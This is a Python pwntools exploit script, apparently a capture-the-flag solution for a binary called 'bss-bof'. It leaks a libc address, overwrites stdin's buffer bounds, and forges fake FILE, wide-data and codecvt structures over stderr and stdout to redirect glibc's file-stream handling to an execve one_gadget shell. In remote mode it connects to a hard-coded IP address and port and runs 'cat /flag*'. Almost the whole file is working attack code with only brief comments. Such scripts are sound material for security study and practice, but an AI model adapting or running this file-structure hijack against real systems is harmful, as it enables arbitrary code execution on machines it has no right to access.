#!/usr/bin/env python3
from pwn import *
import time


context.binary = ELF("./_src/bss-bof/bss-bof", checksec=False)

HOST = "35.194.108.145"
PORT = 37299

PRINTF_OFF = 0x60100
STDIN_OFF = 0x2038E0
STDIN_LOCK_OFF = 0x205720
WIDE_STDIN_OFF = 0x2039C0
LIST_OFF = 0x2044C0
STDERR_OFF = 0x2044E0
STDOUT_OFF = 0x2045C0
WFILE_JUMPS_OFF = 0x202228
ONE_GADGET_OFF = 0xEF52B
SHORTBUF_DELTA = 0x83

LIST_REL = LIST_OFF - STDIN_OFF - SHORTBUF_DELTA
STDERR_REL = STDERR_OFF - STDIN_OFF - SHORTBUF_DELTA
STDOUT_REL = STDOUT_OFF - STDIN_OFF - SHORTBUF_DELTA


def start():
    if args.REMOTE:
        return remote(args.HOST or HOST, int(args.PORT or PORT))
    return process(context.binary.path)


def build_payload(libc_base):
    stdin = libc_base + STDIN_OFF
    stderr = libc_base + STDERR_OFF
    stdout = libc_base + STDOUT_OFF
    shortbuf = stdin + SHORTBUF_DELTA
    wide = stdout
    lock = stdout + 0x100
    codecvt = stdout + 0x120

    payload = bytearray(b"\n" + b"\x00" * (STDOUT_REL + 0x200 - 1))

    def wq(offset, value):
        payload[offset:offset + 8] = p64(value)

    def wd(offset, value):
        payload[offset:offset + 4] = p32(value & 0xFFFFFFFF)

    # Preserve the live tail of stdin: the oversized underflow starts at _shortbuf.
    wq(0x05, libc_base + STDIN_LOCK_OFF)
    wq(0x0D, 0xFFFFFFFFFFFFFFFF)
    wq(0x15, 0)
    wq(0x1D, libc_base + WIDE_STDIN_OFF)
    wq(0x25, 0)
    wq(0x2D, 0)
    wq(0x35, 0)
    wd(0x3D, 0xFFFFFFFF)

    # Repoint _IO_list_all to a fake wide FILE living at stderr.
    wq(LIST_REL, stderr)
    wd(STDERR_REL + 0x00, 0)
    wq(STDERR_REL + 0x68, 0)
    wq(STDERR_REL + 0x88, lock)
    wq(STDERR_REL + 0xA0, wide)
    wd(STDERR_REL + 0xC0, 1)
    wq(STDERR_REL + 0xD8, libc_base + WFILE_JUMPS_OFF)

    # Fake _IO_wide_data at stdout.
    wq(STDOUT_REL + 0x18, 0)
    wq(STDOUT_REL + 0x20, 4)
    wq(STDOUT_REL + 0x30, 0)
    wq(STDOUT_REL + 0x38, 0)
    wq(STDOUT_REL + 0xE0, codecvt)

    # Fake codecvt object: argv[1] is "-p", indirect target is an execve one_gadget.
    payload[STDOUT_REL + 0x120:STDOUT_REL + 0x123] = b"-p\x00"
    wq(STDOUT_REL + 0x120 + 0x68, libc_base + ONE_GADGET_OFF)

    return stdin, shortbuf + len(payload), bytes(payload)


def exploit(io):
    leak_line = io.recvline()
    printf_addr = int(leak_line.strip().split()[-1], 16)
    libc_base = printf_addr - PRINTF_OFF
    log.info(f"libc base = {libc_base:#x}")

    stdin, new_end, payload = build_payload(libc_base)
    io.send(p64(stdin + 0x40))
    io.send(p64(new_end))
    time.sleep(0.05)
    io.send(payload)


def main():
    io = start()
    exploit(io)

    cmd = None
    if args.CMD:
        cmd = args.CMD.encode()
    elif args.REMOTE:
        cmd = b"cat /flag*; exit"

    if cmd is None:
        io.interactive()
        return

    time.sleep(0.2)
    io.sendline(cmd)
    print(io.recvrepeat(2).decode("latin1", "replace"), end="")


if __name__ == "__main__":
    main()
